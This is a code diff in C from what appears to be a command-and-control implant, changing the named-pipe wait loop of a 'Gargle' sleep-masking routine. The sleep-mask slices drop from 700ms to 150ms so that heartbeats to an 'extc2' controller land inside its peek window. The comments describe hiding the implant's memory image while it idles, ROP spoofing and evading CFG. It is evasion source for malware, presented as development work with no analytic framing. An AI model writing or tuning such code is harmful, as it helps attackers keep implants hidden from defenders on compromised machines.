@@ -32,17 +32,19 @@ static void setup_trampoline2() {
 }
 
 void GargleBlockPipe(HANDLE pipe) {
-	/* Phase 2 wait-window: idle-wait for pipe data masked, in gen3 sleep
-	 * slices (each slice = full mask + ROP spoof when the engine serves
-	 * it). The peek itself is a microsecond syscall between windows.
-	 * Guard semantics unchanged: threaded parents and nook==0 profiles
-	 * keep the plain (unmasked) behavior - masking under a live sibling
-	 * thread would corrupt its view of the image. */
+	/* Phase 2 wait-window: idle-wait for pipe data masked, in 150ms gen3
+	 * slices. 150ms (not 700) because the extc2 controller contract is
+	 * strict alternation with a 0.4s peek window: the heartbeat reply
+	 * after a skip frame must land inside it or the relay deadlocks on
+	 * FlushFileBuffers (round 18). Slices stay under the timer-free mask
+	 * path - no ROP, CFG-immune; the peek between windows is a
+	 * microsecond syscall. Guard semantics unchanged: threaded parents
+	 * and nook==0 profiles keep the plain behavior. */
 	if (setting_int(SETTING_GARGLE_NOOK) != 0 && threadcount == 0) {
 		DWORD avail = 0;
 		while (PeekNamedPipe(pipe, NULL, 0, NULL, &avail, NULL) && avail == 0)
-			if (!gen3_sleep(700))
-				Sleep(700);
+			if (!gen3_sleep(150))
+				Sleep(150);
 	}
 }
 
